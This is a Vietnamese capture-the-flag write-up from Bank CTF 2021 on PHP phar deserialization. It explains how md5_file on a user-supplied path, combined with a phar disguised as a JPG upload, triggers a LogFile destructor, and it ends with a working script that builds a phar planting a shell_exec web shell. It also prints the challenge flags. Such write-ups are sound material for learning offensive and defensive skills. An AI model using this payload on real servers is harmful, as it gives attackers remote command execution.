# Phar deserialization - Bank CTF 2021

## Source code : [lele.zip](https://github.com/CTF-STeam/ctf-writeups/files/6240642/lele.zip)

## Writeup :
- Khi lướt qua nội dung 3 file **upload.php** **md5.php** và **logging.php** , ta thấy được **logging.php** chỉ được include chứ không được gọi lần nào cả. Đây chính là hint của tác giả ra đề.
- **logging.php** có định nghĩa hàm ```_destruct() ``` của class **Logfile** được sử dụng ghi ra 1 file. Rõ ràng tác giả muốn nói rằng, ta phải khai thác class **LogFile** trong **logging.php**
- Với thông tin trên, chắc chắn attack vector của bài này là phar deserialization. Vấn đề là nó sẽ deserialization ở đâu.
- Nhìn vào file **md5.php** như dưới đây
```
<?php
    session_start();
    include 'logging.php';
    //echo $_SESSION['path'];
    if(isset($_GET['file'])){
        $file = str_replace('<','',$_GET['file'],$i);
        if ($i){
                die();
        }
        $a = md5_file($file);
        echo '<b>MD5 '.$file.':</b>';
        echo '<br>'.$a;
        echo "<br><a href='./index.html'>Back</a>";
    }
    else{
        $a = md5_file($_SESSION['path']);
        echo '<b>MD5 '.$_SESSION['path'].':</b>';
        echo '<br>'.$a;
        echo "<br><a href='./index.html'>Back</a>";
    }

	/*DienTapATTT{nobug_nobounty__bigbug_bigbounty_nopain_nogain}*/
?>
```
- Đọc blog ở https://www.programmersought.com/article/22324374929/ ,  ta thấy **md5_file** có thể lợi dụng để deserialize phar. Quá toẹt vời! Chỉ cần upload được file phar lên là sẽ deserialization attack
- Tuy nhiên, check file **upload.php** , đoạn code bên dưới là đoạn chỉ cho phép upload **jpg, png, gif** 
```
$allowedExtensions = ['jpg', 'png', 'gif'];

    $fName = $_FILES['imageUpload']['name'];
    $fName = str_replace('<','',$fName,$i);
    if ($i){
        echo 'File name is not allowed!hihi';
        echo "<br><a href='./index.html'>Back</a>";
        die();
    }
    $fSize = $_FILES['imageUpload']['name'];
    $fTmp = $_FILES['imageUpload']['tmp_name'];
    $fType = $_FILES['imageUpload']['type'];
    $fExt = strtolower(end(explode('.', $fName)));
```
- Quay lại blog bên trên https://www.programmersought.com/article/30483796863/ , tác giả có viết như sau
```
 Sam Thomas found that the Phar file can be hidden in a JPG file, so this step can be directly achieved by using the common image upload function
```
- Vậy là đủ yếu tố để thực hiện exploit, cơ bản ý tưởng sẽ như sau
  + Tạo 1 file phar tên **payload.phar**
  + Rename file thành **payload.jpg**
  + Upload file, file sẽ được lưu ở /var/www/uploads/payload.jpg
  + Gọi http://target/md5.php?file=phar://var/www/uploads/payload.jpg
  + Shell sẽ được ghi trên server
  + Flag! **ATTT{PharDeserialization_1412.}**
## Payload
```
<?php
include 'logging.php';
$payload = new LogFile();
$payload->filename = '/var/www/html/uploads/shellvl.php';
$payload->fcontents = "<?php echo shell_exec(\$_GET['e'].' 2>&1'); ?>";
var_dump($payload);

// create new Phar
@unlink("payload.phar");
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');
//set payload
$phar->setMetadata($payload);
$phar->stopBuffering();
?> 
```
Chạy ```php poc.php``` sẽ sinh ra **payload.phar**
